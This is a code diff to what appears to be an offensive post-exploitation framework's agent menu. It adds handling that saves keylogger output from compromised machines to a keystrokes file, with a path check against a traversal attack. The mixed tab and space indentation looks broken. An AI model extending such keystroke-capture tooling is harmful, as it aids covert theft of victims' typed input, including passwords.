@@ -1466,7 +1466,6 @@ class PowerShellAgentMenu(cmd.Cmd):
         """
         Handle agent event signals.
         """
-
         if '[!] Agent' in signal and 'exiting' in signal:
             pass
 
@@ -1477,7 +1476,17 @@ class PowerShellAgentMenu(cmd.Cmd):
             # while we are interacting with it
             results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
             if results:
-                print "\n" + results
+		if sender == "AgentsPsKeyLogger" and ("Job started:" not in results) and ("killed." not in results):
+            	    safePath = os.path.abspath("%sdownloads/" % self.mainMenu.installPath)
+		    savePath = "%sdownloads/%s/keystrokes.txt" % (self.mainMenu.installPath,self.sessionID)
+		    if not os.path.abspath(savePath).startswith(safePath):
+                        dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (self.sessionID), sender='Agents')
+                 	return
+		    with open(savePath,"a+") as f:
+			new_results = results.replace("\r\n","").replace("[SpaceBar]", "").replace('\b', '').replace("[Shift]", "").replace("[Enter]\r","\r\n")
+		        f.write(new_results)
+		else:
+                   print "\n" + results
 
         elif "[+] Part of file" in signal and "saved" in signal:
             if (str(self.sessionID) in signal) or (str(name) in signal):
